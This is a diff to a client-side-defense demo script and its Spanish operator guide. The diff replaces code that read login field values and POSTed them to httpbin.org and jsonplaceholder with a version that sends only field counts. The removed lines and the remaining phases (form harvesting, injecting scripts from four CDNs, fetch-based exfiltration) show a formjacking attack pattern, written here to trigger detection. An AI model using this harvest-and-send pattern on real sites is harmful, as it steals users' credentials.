@@ -52,7 +52,7 @@ var _poll = _si(function() {
       window.HTMLInputElement.prototype, 'value').set;
     nativeSet.call(emailEl, 'test@example.com');
     emailEl.dispatchEvent(new Event('input', { bubbles: true }));
-    nativeSet.call(passEl, 'P@ssword123');
+    nativeSet.call(passEl, '<DEMO_PASSWORD>');
     passEl.dispatchEvent(new Event('input', { bubbles: true }));
 
     // Run Combined Detection Script inline using native fetch for exfil
@@ -63,12 +63,11 @@ var _poll = _si(function() {
 
       _log('\n[Formjack] Phase 1: Form field harvesting');
       var inputs = document.querySelectorAll('input');
-      var harvested = {};
+      var populatedFieldCount = 0;
       inputs.forEach(function(input) {
-        var name = input.name || input.id || input.type;
-        harvested[name] = input.value || '(empty)';
+        if (input.value) populatedFieldCount++;
       });
-      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+      _log('[Formjack] Observed ' + inputs.length + ' fields; values discarded');
 
       _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
       var cdns = [
@@ -88,19 +87,20 @@ var _poll = _si(function() {
 
       _log('\n[Exfil] Phase 3: Data exfiltration');
       var payload = JSON.stringify({
-        type: 'combined_demo', credentials: harvested,
-        page: window.location.href, timestamp: Date.now()
+        type: 'combined_demo', field_count: inputs.length,
+        populated_field_count: populatedFieldCount,
+        field_values_discarded: true, timestamp: Date.now()
       });
       _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
-        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
+        .then(function() { _log('[Exfil] Synthetic signal sent to www.httpbin.org'); });
       _fetch('https://jsonplaceholder.typicode.com/posts', {
         method: 'POST', mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' }, body: payload
-      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });
+      }).then(function() { _log('[Exfil] Synthetic signal sent to jsonplaceholder.typicode.com'); });
 
       _log('\n==================================================');
       _log('[CSD Demo] Simulation complete');
-      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+      _log('[CSD Demo] Fields observed: ' + inputs.length + ' (values discarded)');
       _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
       _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
       _log('==================================================');
@@ -130,7 +130,7 @@ var _poll = _si(function() {
 Los operadores sin herramientas de automatización de navegador realizan los pasos manualmente:
 
 1. **Navegar** a la página de inicio de sesión de la aplicación protegida: `http://xF5XC_DOMAINNAMEx/#/login`
-2. **Ingresar credenciales ficticias** — escriba `test@example.com` en el campo Email y `P@ssword123` en el campo Password (no envíe el formulario)
+2. **Ingresar credenciales ficticias** — escriba `test@example.com` en el campo Email y `<DEMO_PASSWORD>` en el campo Password (no envíe el formulario)
 3. **Abrir DevTools** — presione **F12** y cambie a la pestaña **Console**
 4. **Ejecutar el Script de Detección Combinado** — pegue el script de [Detección de activación &mdash; Ejecutar el Script de Simulación Combinado](/csd/es/trigger-detection/#run-the-combined-simulation-script) en la consola y presione Enter
 5. **Verificar la salida de la consola** — confirme que la salida por fases `[CSD Demo]` muestre: recolección de campos del formulario, inyección de scripts desde 4 dominios CDN y exfiltración de datos a 2 endpoints
@@ -141,7 +141,7 @@ Los operadores sin herramientas de automatización de navegador realizan los pas
 | --- | --- | --- |
 | Recolección de campos del formulario | Lee los valores de los campos de entrada de email y contraseña | Scripts que leen campos de formulario sensibles — marcados como Riesgo Alto |
 | Inyección de scripts | Inyecta 4 etiquetas `&lt;script&gt;` desde `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io` | Hasta 4 nuevos dominios de scripts de terceros detectados (la disponibilidad del CDN varía) |
-| Exfiltración de datos | Envía datos recolectados mediante `fetch` a `www.httpbin.org` y `jsonplaceholder.typicode.com` | Llamadas de red a dominios externos |
+| Señales de red sintéticas | Envía recuentos de campos y marcadores de descarte mediante `fetch`; los valores nunca entran en la carga útil | Llamadas de red a dominios externos |
 
 <Aside type="note">
 **La disponibilidad del CDN varía.** No todos los 4 scripts CDN se cargarán en cada
